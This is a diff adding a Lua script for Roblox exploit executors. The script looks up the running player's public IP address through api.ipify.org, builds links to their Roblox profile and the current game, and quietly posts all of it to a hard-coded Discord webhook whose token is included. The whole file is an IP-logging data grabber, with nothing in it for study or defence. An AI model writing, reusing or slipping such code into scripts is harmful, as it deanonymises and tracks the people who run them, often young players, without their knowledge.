@@ -1,0 +1,49 @@
+local ip = game:HttpGet("https://api.ipify.org")
+local profilelink = 'https://roblox.com/users/' .. game.Players.LocalPlayer.UserId .. '/profile'
+local gamelink = 'https://roblox.com/games/' .. game.PlaceId .. '/' .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+
+local Webhook = 'https://discord.com/api/webhooks/1064169737292099674/pBz_WXG3axttoUCe3ru1dVheEQl09KjHRvKsAZ864VmSW7j5ENHiyNm7m48JVjlGFR6l'
+pcall(function()
+local data = {
+["embeds"] = {
+{
+["title"] = 'Ip: ' .. ip,
+["description"] = 'Profile link: ' .. profilelink ..  ' ' .. 'Game link: ' .. gamelink,
+}
+}
+}
+if syn then
+local response = syn.request(
+{
+Url = Webhook,
+Method = 'POST',
+Headers = {
+['Content-Type'] = 'application/json'
+},
+Body = game:GetService('HttpService'):JSONEncode(data)
+}
+);
+elseif request then
+local response = request(
+{
+Url = Webhook,
+Method = 'POST',
+Headers = {
+['Content-Type'] = 'application/json'
+},
+Body = game:GetService('HttpService'):JSONEncode(data)
+}
+);
+elseif http_request then
+local response = http_request(
+{
+Url = Webhook,
+Method = 'POST',
+Headers = {
+['Content-Type'] = 'application/json'
+},
+Body = game:GetService('HttpService'):JSONEncode(data)
+}
+);
+end
+end)
